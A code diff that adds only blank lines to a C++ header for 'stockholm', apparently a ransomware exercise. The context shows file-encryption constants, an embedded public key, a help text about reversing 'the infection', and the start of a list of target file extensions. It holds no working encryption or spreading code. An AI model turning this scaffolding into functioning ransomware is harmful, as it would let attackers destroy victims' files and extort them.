@@ -19,7 +19,10 @@ inline constexpr auto TAG_FINAL = crypto_secretstream_xchacha20poly1305_TAG_FINA
 inline constexpr auto BIN = std::ios::binary;
 inline const std::string TMP_EXT = ".encryptedtmp";
 inline const std::string ASYM_KEY_PUB = "8681dd04a8a67ba13c4df7693c3a242a3c08bb48187512096e6c1a3be97f4139";
+
+
 inline const std::string VERSION = "Version: 1.0";
+
 inline const std::string HELP = R"(
 Usage: stockholm [OPTIONS]
 
@@ -29,6 +32,7 @@ Options:
   -s, --silent          Suppress all output
   -r, --reverse KEY     Reverse the infection using the given KEY (must be at least 16 characters)
 )";
+
 
 inline const std::vector<std::string> VALID_EXT = {
     ".123",
